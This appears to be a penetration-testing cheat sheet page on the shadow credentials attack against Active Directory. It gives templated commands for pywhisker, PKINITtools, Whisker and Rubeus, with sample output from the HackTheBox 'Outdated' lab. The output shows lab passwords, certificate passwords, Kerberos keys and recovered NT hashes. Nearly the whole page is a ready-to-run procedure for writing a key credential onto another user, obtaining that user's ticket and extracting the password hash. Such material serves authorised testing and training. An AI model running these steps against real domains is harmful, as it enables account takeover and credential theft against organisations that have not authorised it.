---
title: "AddKeyCredentialLink"
date: 2024-7-31
tags: ["Shadow Credentials", "Pass-The-Cert", "AddkeyCredentialLink", "Active Directory", "Windows", "Whisker", "Pywhisker"]
---

### Privesc #1: Shadow credentials

{{< tab set1 tab1 >}}Linux{{< /tab >}}
{{< tab set1 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 0. Pre-check \[optional\]

```console
python3 pywhisker.py -t '<TARGET_USER>' --action list -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --dc-ip <DC_IP> --use-ldaps
```

```console {class="sample-code"}
$ python3 pywhisker.py --action list -d outdated.htb -u 'btables' -p '5myBPLPDKT3Bfq' --dc-ip 10.10.11.175 -t 'sflowers' --use-ldaps
[*] Searching for the target account
[*] Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb
[*] Attribute msDS-KeyCredentialLink is either empty or user does not have read permissions on that attribute
```

#### 1. Add shadow credentials

```console
python3 pywhisker.py --action add -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --dc-ip <DC_IP> -t '<TARGET_USER>' --use-ldaps
```

```console {class="sample-code"}
$ python3 pywhisker.py --action add -d outdated.htb -u 'btables' -p '5myBPLPDKT3Bfq' --dc-ip 10.10.11.175 -t 'sflowers' --use-ldaps
[*] Searching for the target account
[*] Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 3c90e8fb-0405-f373-5424-32d34084ccce
[*] Updating the msDS-KeyCredentialLink attribute of sflowers
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: 3p24aKIn.pfx
[*] Must be used with password: qFhAIiIMg5ys4SQYYOst
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

<br>

```console
# Fix module 'OpenSSL.crypto' has no attribute 'PKCS12Type'
pip3 install -I pyopenssl==24.0.0
```

#### 2. Request TGT using the PFX

```console
sudo ntpdate -s <DC> && python3 gettgtpkinit.py -cert-pfx <PFX_FILE> -pfx-pass '<GENERATED_PASSWORD>' '<DOMAIN>/<TARGET_USER>' <TARGET_USER>.ccache -dc-ip <DC>
```

```console {class="sample-code"}
$ sudo ntpdate -s 10.10.11.175 && python3 gettgtpkinit.py -cert-pfx 3p24aKIn.pfx -pfx-pass 'qFhAIiIMg5ys4SQYYOst' 'outdated.htb/sflowers' sflowers.ccache -dc-ip 10.10.11.175

2024-09-23 01:48:14,567 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2024-09-23 01:48:14,578 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2024-09-23 01:48:38,986 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2024-09-23 01:48:38,987 minikerberos INFO     a1870bb416f2b965df3df681288f3b272119d86288c67c572675b80ea1bedd94
INFO:minikerberos:a1870bb416f2b965df3df681288f3b272119d86288c67c572675b80ea1bedd94
2024-09-23 01:48:38,990 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

#### 3. Get NT hash

```console
export KRB5CCNAME=<TARGET_USER>.ccache
```

```console
python3 getnthash.py '<DOMAIN>/<TARGET_USER>' -key <AS_REP_ENC_KEY>
```

```console {class="sample-code"}
$ python3 getnthash.py 'outdated.htb/sflowers' -key a1870bb416f2b965df3df681288f3b272119d86288c67c572675b80ea1bedd94
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
1fcdb1f6015dcb318cc77bb2bda14db5
```

<small>*Ref: [pywhisker](https://github.com/ShutdownRepo/pywhisker)*</small>
<br>
<small>*Ref: [PKINITtools](https://github.com/dirkjanm/PKINITtools)*</small>

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### 0. Pre-check \[optional\]

```console
.\whisker.exe list /domain:<DOMAIN> /target:'<TARGET_USER>' /dc:<DC>
```

```console {class="sample-code"}
PS C:\programdata> .\whisker.exe list /domain:outdated.htb /target:'sflowers' /dc:10.10.11.175
[*] Searching for the target account
[*] Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb
[*] Listing deviced for sflowers:
[*] No entries!
```

#### 1. Add shadow credentials

```console
.\whisker.exe add /domain:<DOMAIN> /target:'<TARGET_USER>' /dc:<DC> /password:'<PFX_PASSWORD>'
```

```console {class="sample-code"}
PS C:\programdata> .\whisker.exe add /domain:outdated.htb /target:'sflowers' /dc:10.10.11.175 /password:'Test1234'
[*] No path was provided. The certificate will be printed as a Base64 blob
[*] Searching for the target account
[*] Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID 06a332a6-1ef1-4e73-bb9b-f5e5d1f9e963
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] You can now run Rubeus with the following syntax:

Rubeus.exe asktgt /user:sflowers /certificate:MIIJuAIBAz ... [SNIP]... TvhwICB9A= /password:"Test1234" /domain:outdated.htb /dc:10.10.11.175 /getcredentials /show
```

#### 2. Request TGT using PFX file and get NTLM hash

```console
.\rubeus.exe asktgt /user:'<TARGET_USER>' /certificate:'<BASE64_PFX>' /password:'<PFX_PASSWORD>' /domain:<DOMAIN> /dc:<DC> /getcredentials /show
```

```console {class="sample-code"}
PS C:\programdata> .\Rubeus.exe asktgt /user:sflowers /certificate:'MIIJuAIBAz ... [SNIP]... TvhwICB9A=' /password:"Test1234" /domain:outdated.htb /dc:10.10.11.175 /getcredentials /show

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=sflowers 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'outdated.htb\sflowers'
[*] Using domain controller: 10.10.11.175:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIF0jCCBc ...[SNIP]... F0ZWQuaHRi

  ServiceName              :  krbtgt/outdated.htb
  ServiceRealm             :  OUTDATED.HTB
  UserName                 :  sflowers
  UserRealm                :  OUTDATED.HTB
  StartTime                :  9/22/2024 10:57:36 AM
  EndTime                  :  9/22/2024 8:57:36 PM
  RenewTill                :  9/29/2024 10:57:36 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  vqosgxeFibuRzlIPfnejKQ==
  ASREP (key)              :  1E1FB4543905764478F7F129026B67A6

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 1FCDB1F6015DCB318CC77BB2BDA14DB5
```

<small>*Ref: [Whisker.exe](https://github.com/eladshamir/Whisker)*</small>

{{< /tabcontent >}}
